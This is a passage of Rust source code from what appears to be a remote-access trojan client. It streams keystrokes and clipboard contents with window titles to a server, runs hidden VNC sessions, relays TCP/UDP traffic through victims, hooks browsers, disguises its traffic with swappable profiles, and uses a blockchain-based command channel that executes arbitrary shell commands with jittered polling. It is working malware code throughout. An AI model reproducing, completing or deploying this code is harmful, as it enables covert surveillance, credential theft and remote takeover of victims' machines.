                "physicalHeight": vh,
                "osName": sysinfo::System::name().unwrap_or_default(),
                "clientType": "rust",
                "uptime": sysinfo::System::uptime(),
                "targetFps": target_fps,
                "jpegQuality": adaptive_quality,
                "actualFps": (actual_fps * 10.0).round() / 10.0,
                "encodingMode": encoding_mode,
                "keyloggerActive": keylogger_active,
                "clipboardMonitorActive": clipboard_mon,
                "hvncActive": hvnc_active,
                "vncActive": vnc_active,
            });
            let _ = control_tx.send(build_message(MSG_STATE_SYNC, state_msg.to_string().as_bytes()));
        }

        // ---- Keylog flush every 5 seconds ----
        if last_keylog_flush.elapsed() >= Duration::from_secs(5) {
            last_keylog_flush = Instant::now();
            let entries = {
                let st = state.lock().unwrap();
                if st.keylogger.is_active() {
                    st.keylogger.drain()
                } else {
                    Vec::new()
                }
            };
            for entry in entries {
                if let Ok(msg_bytes) = serde_json::to_vec(&entry) {
                    let _ = control_tx.send(build_message(MSG_KEYLOG, &msg_bytes));
                }
            }
        }

        // ---- Clipboard monitor check every 5 seconds ----
        if clipboard_mon && last_clipboard_check.elapsed() >= Duration::from_secs(5) {
            last_clipboard_check = Instant::now();
            let text = tokio::task::block_in_place(|| clipboard::get_clipboard());
            let hash = clipboard::md5_hash(&text);
            if hash != last_clipboard_hash {
                last_clipboard_hash = hash;
                let window = tokio::task::block_in_place(|| clipboard::get_active_window_title());
                let msg = json!({"text": text, "window": window});
                let _ = control_tx.send(build_message(protocol::MSG_CLIPBOARD_CHANGE, msg.to_string().as_bytes()));
            }
        }

        // ---- Precise sleep to target FPS ----
        // (skip if we already slept in the frame-skip branch above)
        if !skip_sleep {
            let frame_elapsed = frame_start.elapsed();
            if frame_elapsed < interval {
                tokio::time::sleep(interval - frame_elapsed).await;
            }
        }
    }
}

fn publish_frame(frame_tx: &watch::Sender<Option<Vec<u8>>>, frame: Vec<u8>) -> bool {
    if frame_tx.is_closed() {
        return false;
    }
    frame_tx.send_replace(Some(frame));
    true
}

// ------------------------------------------------------------------ //
// Task 4: Adaptive quality helper
//
// Call once per sent frame.  Updates `adaptive_quality` by comparing
// the frame's send time to the frame interval:
//   • send_ms > 80% of interval → reduce quality by 5 (min 30)
//   • send_ms < 40% of interval → increase quality by 2 (max max_quality)
//
// An exponential moving average (α=0.2) is used to smooth fluctuations
// and prevent rapid oscillation.  Adjustments are rate-limited to at
// most once per 500 ms.
// ------------------------------------------------------------------ //

fn update_adaptive_quality(
    quality: &mut u32,
    avg_send_ms: &mut f64,
    last_adj: &mut Instant,
    send_ms: f64,
    interval_ms: f64,
    max_quality: u32,
) {
    // Exponential moving average
    const ALPHA: f64 = 0.2;
    if *avg_send_ms == 0.0 {
        *avg_send_ms = send_ms;
    } else {
        *avg_send_ms = ALPHA * send_ms + (1.0 - ALPHA) * *avg_send_ms;
    }

    // Rate limit adjustments
    if last_adj.elapsed() < Duration::from_millis(500) {
        return;
    }

    let ratio = *avg_send_ms / interval_ms.max(1.0);
    if ratio > 0.80 {
        // Backing up — reduce quality
        let new_q = quality.saturating_sub(5).max(30);
        if new_q != *quality {
            *quality = new_q;
            *last_adj = Instant::now();
            debug!(
                "Adaptive quality: send_ms={:.1} ratio={:.2} → quality reduced to {}",
                avg_send_ms, ratio, quality
            );
        }
    } else if ratio < 0.40 {
        // Bandwidth available — increase quality
        let new_q = (*quality + 2).min(max_quality);
        if new_q != *quality {
            *quality = new_q;
            *last_adj = Instant::now();
            debug!(
                "Adaptive quality: send_ms={:.1} ratio={:.2} → quality increased to {}",
                avg_send_ms, ratio, quality
            );
        }
    }
}

// ------------------------------------------------------------------ //
// Receive loop: process incoming server messages
// ------------------------------------------------------------------ //

async fn receive_loop(
    mut ws_stream: impl StreamExt<Item = Result<Message, tokio_tungstenite::tungstenite::Error>> + Unpin,
    state: Arc<Mutex<ClientState>>,
    control_tx: tokio::sync::mpsc::UnboundedSender<Vec<u8>>,
    henge: Arc<TokioRwLock<henge::HengeProfile>>,
) -> Result<()> {
    while let Some(msg) = ws_stream.next().await {
        let raw = match msg? {
            Message::Binary(b) => b,
            Message::Close(_) => {
                info!("Server closed connection");
                anyhow::bail!("Server closed connection");
            }
            _ => continue,
        };

        // ── Henge: unwrap WS envelope + decode transforms ──
        let raw = henge_apply_inbound(&henge, raw).await;

        if raw.len() < 5 {
            continue;
        }

        let (msg_type, payload) = match parse_message(&raw) {
            Ok(p) => p,
            Err(e) => {
                debug!("Failed to parse message: {}", e);
                continue;
            }
        };

        match msg_type {
            MSG_PING => {
                // Echo timestamp back as PONG
                let _ = control_tx.send(build_message(protocol::MSG_PONG, &payload));
            }
            MSG_VNC_DATA => {
                // Forward raw RFB bytes from server to the VNC server handle
                let st = state.lock().unwrap();
                if let Some(ref vnc) = st.vnc_handle {
                    vnc.feed_rfb_bytes(payload);
                } else {
                    debug!("VNC data received but no VNC server running");
                }
            }
            // Kamui (神威) — binary TCP data relay (server SOCKS5 → client → target)
            MSG_KAMUI_TCP_OPEN => {
                // JSON: {stream_id, host, port}
                if let Ok(open_req) = serde_json::from_slice::<serde_json::Value>(&payload) {
                    let stream_id = open_req["stream_id"].as_u64().unwrap_or(0) as u32;
                    let host = open_req["host"].as_str().unwrap_or("").to_string();
                    let port = open_req["port"].as_u64().unwrap_or(0) as u16;
                    tokio::spawn(async move {
                        kamui::get_manager().handle_tcp_open(stream_id, &host, port).await;
                    });
                }
            }
            MSG_KAMUI_TCP_DATA => {
                // [4B stream_id BE][tcp_data]
                if payload.len() >= 4 {
                    let stream_id = u32::from_be_bytes([payload[0], payload[1], payload[2], payload[3]]);
                    let tcp_data = payload[4..].to_vec();
                    let mgr = kamui::get_manager();
                    tokio::spawn(async move {
                        mgr.handle_tcp_data(stream_id, tcp_data).await;
                    });
                }
            }
            MSG_KAMUI_TCP_CLOSE => {
                tokio::spawn(async move {
                    kamui::handle_raw_tcp_close(&payload).await;
                });
            }
            MSG_KAMUI_TCP_PAUSE => {
                tokio::spawn(async move {
                    kamui::handle_raw_tcp_pause(&payload).await;
                });
            }
            MSG_KAMUI_TCP_RESUME => {
                tokio::spawn(async move {
                    kamui::handle_raw_tcp_resume(&payload).await;
                });
            }
            // Kamui — UDP relay (server → client → local UDP socket)
            MSG_KAMUI_UDP_BIND => {
                // JSON: {relay_id, bind_port}
                tokio::spawn(async move {
                    kamui::handle_raw_udp_bind(&payload).await;
                });
            }
            MSG_KAMUI_UDP_DATA => {
                // [4B relay_id BE][2B dst_port BE][data]
                tokio::spawn(async move {
                    kamui::handle_raw_udp_data(&payload).await;
                });
            }
            MSG_KAMUI_UDP_CLOSE => {
                // JSON: {relay_id}
                tokio::spawn(async move {
                    kamui::handle_raw_udp_close(&payload).await;
                });
            }
            // Kamui — Multi-hop chain data
            MSG_KAMUI_CHAIN_DATA => {
                // [4B chain_stream_id BE][data]
                tokio::spawn(async move {
                    kamui::handle_raw_chain_data(&payload).await;
                });
            }
            MSG_COMMAND => {
                let cmd_val: serde_json::Value = match serde_json::from_slice(&payload) {
                    Ok(v) => v,
                    Err(e) => {
                        debug!("Failed to parse command JSON: {}", e);
                        continue;
                    }
                };

                let cmd_type = cmd_val
                    .get("type")
                    .and_then(|v| v.as_str())
                    .unwrap_or("")
                    .to_string();
                let cmd_payload = cmd_val
                    .get("payload")
                    .and_then(|v| v.as_str())
                    .unwrap_or("")
                    .to_string();

                // Strip leading timestamp prefix "timestamp|actual_payload"
                let cmd_payload_clean = if let Some(pos) = cmd_payload.find('|') {
                    let prefix = &cmd_payload[..pos];
                    if prefix.chars().all(|c| c.is_ascii_digit()) {
                        cmd_payload[pos + 1..].to_string()
                    } else {
                        cmd_payload.clone()
                    }
                } else {
                    cmd_payload.clone()
                };

                // Handle Amaterasu commands (async — spawned as tasks)
                if cmd_type.starts_with("AMATERASU_") {
                    let ct = control_tx.clone();
                    let cmd_t = cmd_type.clone();
                    let payload_c = cmd_payload_clean.clone();
                    tokio::spawn(async move {
                        let replies = amaterasu::dispatch(&cmd_t, &payload_c).await;
                        for msg in replies {
                            let _ = ct.send(msg);
                        }
                    });
                    continue;
                }

                // Handle Kamui commands (async — spawned as tasks)
                if cmd_type.starts_with("KAMUI_") {
                    let ct = control_tx.clone();
                    let cmd_t = cmd_type.clone();
                    let payload_c = cmd_payload_clean.clone();
                    tokio::spawn(async move {
                        let replies = kamui::dispatch(&cmd_t, &payload_c, &ct).await;
                        for msg in replies {
                            let _ = ct.send(msg);
                        }
                    });
                    continue;
                }

                // Handle Byakugan commands (async — spawned as tasks)
                if cmd_type.starts_with("BYAKUGAN_") {
                    let ct = control_tx.clone();
                    let cmd_t = cmd_type.clone();
                    let payload_c = cmd_payload_clean.clone();
                    tokio::spawn(async move {
                        let replies = byakugan::dispatch(&cmd_t, &payload_c).await;
                        for msg in replies {
                            let _ = ct.send(msg);
                        }
                    });
                    continue;
                }

                // Handle Henge profile update (hot-swap without reconnect)
                if cmd_type == "HENGE_PROFILE_UPDATE" {
                    if let Ok(cfg) = serde_json::from_str::<serde_json::Value>(&cmd_payload_clean) {
                        let client_cfg = &cfg["client_config"];
                        let new_profile = henge::HengeProfile::from_client_config(client_cfg);
                        let name = new_profile.name.clone();
                        *henge.write().await = new_profile;
                        info!("[henge] Profile updated in-flight: {}", name);
                    }
                    continue;
                }

                // Handle Kotoamatsukami commands (async — spawned as tasks)
                if cmd_type.starts_with("KOTOAMATSUKAMI_") {
                    let ct = control_tx.clone();
                    let cmd_t = cmd_type.clone();
                    let payload_c = cmd_payload_clean.clone();
                    tokio::spawn(async move {
                        let replies = kotoamatsukami::dispatch(&cmd_t, &payload_c).await;
                        for msg in replies {
                            let _ = ct.send(msg);
                        }
                    });
                    continue;
                }

                // Handle async commands (SHOW_OVERLAY_URL requires HTTP download)
                if cmd_type == "SHOW_OVERLAY_URL" {
                    let parts: Vec<&str> = cmd_payload_clean.splitn(2, '|').collect();
                    let url = if parts.len() == 2 {
                        parts[1].to_string()
                    } else {
                        parts[0].to_string()
                    };
                    let state_c = state.clone();
                    tokio::spawn(async move {
                        download_and_show_overlay(url, state_c).await;
                    });
                    continue;
                }

                // Synchronous command handling (may block briefly for input injection)
                let response = tokio::task::block_in_place(|| {
                    let mut st = state.lock().unwrap();
                    commands::handle_command(&mut st, &cmd_type, &cmd_payload_clean)
                });

                match response {
                    Ok(Some(reply)) => {
                        let _ = control_tx.send(reply);
                    }
                    Ok(None) => {}
                    Err(e) => {
                        debug!("Command error: {}", e);
                    }
                }

                // Browser hook phase 2+3: runs OUTSIDE the state mutex so the
                // slow kill-wait-relaunch cycle doesn't starve the send loop.
                let pending_hook = state.lock().unwrap()._pending_hook.take();
                if let Some(params) = pending_hook {
                    let result = tokio::task::block_in_place(|| {
                        crate::browser_hook::hook_execute(&params)
                    });
                    let (exit_code, stdout, stderr) = match result {
                        Ok(()) => {
                            let mut st = state.lock().unwrap();
                            let msg = crate::browser_hook::hook_commit(&mut st.browser_hook, params);
                            (0, msg, String::new())
                        }
                        Err(e) => (1, String::new(), e),
                    };
                    let out = serde_json::json!({
                        "requestId": "BROWSER_HOOK",
                        "exitCode": exit_code,
                        "stdout": stdout,
                        "stderr": stderr,
                    });
                    let _ = control_tx.send(protocol::build_message(
                        protocol::MSG_CMD_OUTPUT,
                        out.to_string().as_bytes(),
                    ));
                }

                let pending_unhook = state.lock().unwrap()._pending_unhook.take();
                if let Some(params) = pending_unhook {
                    tokio::task::block_in_place(|| {
                        crate::browser_hook::unhook_execute(&params);
                    });
                    {
                        let mut st = state.lock().unwrap();
                        crate::browser_hook::unhook_commit(&mut st.browser_hook, &params.browser);
                    }
                    let out = serde_json::json!({
                        "requestId": "BROWSER_UNHOOK",
                        "exitCode": 0,
                        "stdout": format!("Unhooked {}", params.browser),
                        "stderr": "",
                    });
                    let _ = control_tx.send(protocol::build_message(
                        protocol::MSG_CMD_OUTPUT,
                        out.to_string().as_bytes(),
                    ));
                }

                // Check stop signal
                if state.lock().unwrap().stop_signal {
                    return Ok(());
                }
            }
            // Blockchain C2 — Server sends contract addresses + chain ID after HELLO
            MSG_CHAIN_CONFIG => {
                if let Ok(config) = serde_json::from_slice::<serde_json::Value>(&payload) {
                    info!("[chain] Received CHAIN_CONFIG: registry={}, raven={}",
                        config["registryAddress"].as_str().unwrap_or(""),
                        config["ravenContract"].as_str().unwrap_or(""));
                    // Update the global chain state
                    let mut chain = CHAIN_STATE.lock().unwrap();
                    chain.update_config(&config);
                }
            }
            // Blockchain C2 — Server confirms client wallet was funded
            MSG_CHAIN_FUNDED => {
                if let Ok(info_val) = serde_json::from_slice::<serde_json::Value>(&payload) {
                    info!("[chain] Wallet funded! tx={}, amount={}",
                        info_val["txHash"].as_str().unwrap_or("?"),
                        info_val["amount"].as_str().unwrap_or("?"));
                    // After funding, register on JuubiRegistry (in background)
                    let ct = control_tx.clone();
                    tokio::task::spawn_blocking(move || {
                        let mut chain = CHAIN_STATE.lock().unwrap();
                        if !chain.registered && chain.is_configured() {
                            let endpoint = chain.wallet_address();
                            match chain.register_peer(&endpoint) {
                                Ok(hash) => info!("[chain] Registered on JuubiRegistry: {}", hash),
                                Err(e) => warn!("[chain] Registration failed: {}", e),
                            }
                            // Send chain status back to server
                            let status = serde_json::json!({
                                "wallet": chain.wallet_address(),
                                "registered": chain.registered,
                                "peers": chain.known_peers.len(),
                                "lastRavenBlock": chain.last_raven_block,
                                "lastRegistryBlock": chain.last_registry_block,
                            });
                            let _ = ct.send(build_message(MSG_CHAIN_STATUS,
                                status.to_string().as_bytes()));
                        }
                    });
                }
            }
            _ => {
                debug!("Unknown message type: 0x{:02X}", msg_type);
            }
        }
    }

    anyhow::bail!("WebSocket stream ended")
}

// ------------------------------------------------------------------ //
// Async overlay download helper
// ------------------------------------------------------------------ //

async fn download_and_show_overlay(
    url: String,
    state: Arc<Mutex<ClientState>>,
) {
    info!("Downloading overlay from {}", url);
    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(30))
        .build();

    match client {
        Ok(client) => {
            match client.get(&url).send().await {
                Ok(resp) => {
                    match resp.bytes().await {
                        Ok(bytes) => {
                            let img_data = bytes.to_vec();
                            let shown = tokio::task::block_in_place(|| {
                                let mut st = state.lock().unwrap();
                                commands::show_fullscreen_overlay(&mut st, &img_data, 100)
                            });
                            if shown {
                                info!("Overlay shown from URL ({} bytes)", img_data.len());
                            } else {
                                warn!("Overlay download completed but screen is locked; discarding");
                            }
                        }
                        Err(e) => warn!("Overlay download body error: {}", e),
                    }
                }
                Err(e) => warn!("Overlay download request failed: {}", e),
            }
        }
        Err(e) => warn!("Failed to create HTTP client: {}", e),
    }
}

// ------------------------------------------------------------------ //
// Blockchain C2 polling loop
//
// Runs in the background after HELLO. Every poll_interval_secs:
// 1. Polls RavenC2 for new commands → executes → posts response
// 2. Polls JuubiRegistry for peer messages → processes
// 3. Discovers new peers via PeerRegistered events
//
// Uses spawn_blocking because eth_rpc is reqwest::blocking.
// ------------------------------------------------------------------ //

async fn blockchain_poll_loop(
    control_tx: tokio::sync::mpsc::UnboundedSender<Vec<u8>>,
) {
    // Wait a few seconds for CHAIN_CONFIG to arrive from server
    tokio::time::sleep(Duration::from_secs(5)).await;

    let (enabled, interval) = {
        let chain = CHAIN_STATE.lock().unwrap();
        (chain.is_configured(), chain.poll_interval_secs)
    };

    if !enabled {
        info!("[chain] Blockchain C2 not configured — polling disabled");
        return;
    }

    let wallet = {
        let chain = CHAIN_STATE.lock().unwrap();
        chain.wallet_address()
    };
    info!("[chain] Blockchain C2 polling started — wallet={}, interval={}s", wallet, interval);

    // ── CRITICAL: Send wallet to server IMMEDIATELY so it can auto-fund us ──
    // Without this, _auto_fund_client() on the server has no wallet address
    // and the funding never happens (chicken-and-egg deadlock).
    {
        let chain = CHAIN_STATE.lock().unwrap();
        let status = serde_json::json!({
            "wallet": chain.wallet_address(),
            "registered": chain.registered,
            "peers": chain.known_peers.len(),
            "lastRavenBlock": chain.last_raven_block,
            "lastRegistryBlock": chain.last_registry_block,
        });
        let _ = control_tx.send(build_message(MSG_CHAIN_STATUS,
            status.to_string().as_bytes()));
        info!("[chain] Sent initial CHAIN_STATUS with wallet={}", chain.wallet_address());
    }

    // Initial registration attempt (if we already have gas)
    {
        let ct = control_tx.clone();
        tokio::task::spawn_blocking(move || {
            let mut chain = CHAIN_STATE.lock().unwrap();
            if !chain.registered && !chain.contract_address.is_empty() {
                let rpcs = chain.rpcs();
                let rpc_refs: Vec<&str> = rpcs.iter().map(|s| s.as_str()).collect();
                let addr = chain.wallet_address();
                if let Ok(balance) = eth_rpc::get_balance(&addr, &rpc_refs) {
                    if balance > 50_000_000_000_000 {
                        // Has > 0.00005 ETH, enough for registration
                        let endpoint = addr.clone();
                        match chain.register_peer(&endpoint) {
                            Ok(hash) => info!("[chain] Auto-registered: {}", hash),
                            Err(e) => debug!("[chain] Auto-registration failed (will retry): {}", e),
                        }
                    } else {
                        info!("[chain] Wallet balance too low for registration ({} wei), waiting for funding", balance);
                    }
                }
            }
        }).await.ok();
    }

    // Main polling loop
    loop {
        // Add jitter: ±20% to avoid all clients polling at the same time
        let jitter = {
            use rand::Rng;
            let mut rng = rand::thread_rng();
            let base = interval as f64;
            let range = base * 0.2;
            rng.gen_range((base - range)..=(base + range)) as u64
        };
        tokio::time::sleep(Duration::from_secs(jitter)).await;

        let ct = control_tx.clone();
        let poll_result = tokio::task::spawn_blocking(move || {
            blockchain_poll_tick(&ct)
        }).await;

        if let Err(e) = poll_result {
            warn!("[chain] Poll task panicked: {}", e);
        }
    }
}

/// Single poll tick — runs inside spawn_blocking (blocking context).
fn blockchain_poll_tick(
    control_tx: &tokio::sync::mpsc::UnboundedSender<Vec<u8>>,
) {
    let mut chain = CHAIN_STATE.lock().unwrap();
    if !chain.is_configured() {
        return;
    }

    // 1. Poll RavenC2 for new server commands
    let commands = chain.poll_raven_commands();
    for cmd in &commands {
        if let Some(ref text) = cmd.text {
            info!("[chain] RavenC2 command #{}: {}", cmd.msg_id,
                if text.len() > 80 { &text[..80] } else { text });

            // Parse command format: "EXEC|<command>" or "CMD|<type>|<payload>"
            if let Some(exec_cmd) = text.strip_prefix("EXEC|") {
                // Execute shell command
                let output = execute_shell_command(exec_cmd);
                // Post response back to RavenC2
                let response = serde_json::json!({
                    "from": chain.wallet_address(),
                    "type": "response",
                    "cmd_id": cmd.msg_id,
                    "result": output,
                });
                match chain.post_response(response.to_string().as_bytes()) {
                    Ok(hash) => info!("[chain] Response posted: {}", hash),
                    Err(e) => warn!("[chain] Failed to post response: {}", e),
                }
            } else if let Some(rest) = text.strip_prefix("CMD|") {
                // Forward as a regular command via the WS control channel
                let parts: Vec<&str> = rest.splitn(2, '|').collect();
                let cmd_type = parts[0];
                let cmd_payload = if parts.len() > 1 { parts[1] } else { "" };
                let cmd_json = serde_json::json!({
                    "type": cmd_type,
                    "payload": cmd_payload,
                });
                let _ = control_tx.send(build_message(
                    protocol::MSG_COMMAND,
                    cmd_json.to_string().as_bytes(),
                ));
            }
        }
    }

    // 2. Discover new peers
    chain.discover_peers();

    // 3. Poll peer-to-peer messages
    let messages = chain.poll_peer_messages();
    for msg in &messages {
        let from_hex = eth_tx::hex_encode(&msg.from_hash);
        info!("[chain] Peer message from 0x{}...{} ({} bytes)",
            &from_hex[..8], &from_hex[56..], msg.data.len());

        // Try to decode as UTF-8 JSON for structured commands
        if let Ok(text) = String::from_utf8(msg.data.clone()) {
            if let Ok(peer_cmd) = serde_json::from_str::<serde_json::Value>(&text) {
                if let Some(cmd_type) = peer_cmd["type"].as_str() {
                    let payload = peer_cmd["payload"].as_str().unwrap_or("");
                    let cmd_json = serde_json::json!({
                        "type": cmd_type,
                        "payload": payload,
                    });
                    let _ = control_tx.send(build_message(
                        protocol::MSG_COMMAND,
                        cmd_json.to_string().as_bytes(),
                    ));
                }
            }
        }
    }
}

/// Execute a shell command and return stdout+stderr as a string.
fn execute_shell_command(cmd: &str) -> String {
    #[cfg(windows)]
    {
        match std::process::Command::new("cmd")
            .args(["/C", cmd])
            .output()
        {
            Ok(output) => {
                let stdout = String::from_utf8_lossy(&output.stdout);
                let stderr = String::from_utf8_lossy(&output.stderr);
                if stderr.is_empty() {
                    stdout.to_string()
                } else {
                    format!("{}\n{}", stdout, stderr)
                }
            }
            Err(e) => format!("exec error: {}", e),
        }
    }
    #[cfg(not(windows))]
    {
        match std::process::Command::new("sh")
            .args(["-c", cmd])
            .output()
        {
            Ok(output) => {
                let stdout = String::from_utf8_lossy(&output.stdout);
                let stderr = String::from_utf8_lossy(&output.stderr);
                if stderr.is_empty() {
                    stdout.to_string()
                } else {
                    format!("{}\n{}", stdout, stderr)
                }
            }
            Err(e) => format!("exec error: {}", e),
        }
    }
}

```